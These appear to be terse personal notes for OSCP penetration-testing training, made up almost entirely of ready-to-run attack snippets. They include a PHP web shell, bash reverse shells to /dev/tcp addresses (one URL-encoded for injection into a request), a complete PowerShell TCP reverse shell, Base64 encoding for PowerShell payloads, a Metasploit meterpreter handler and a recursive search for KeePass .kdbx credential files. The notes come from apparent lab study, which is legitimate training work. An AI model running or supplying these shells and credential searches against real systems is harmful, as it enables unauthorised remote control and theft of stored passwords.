- SSH connection to OSCP machines
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```
- Bash One-Liners
```
	for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```
- SecLists Project - collection of wordlists
- PHP command execution
```
<?php echo system($_GET['cmd']); ?>
```
- One liner reverse shell
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F4444%200%3E%261%22
```

- powershell one liner reverse shell

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.230',4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex '. { $data } 2>&' | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
![[rev.ps1]]

Base64 encoding for powershell
```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 
$EncodedText = [Convert]::ToBase64String($Bytes) 
```

msfconsole 

```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

```
find using powershell

Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue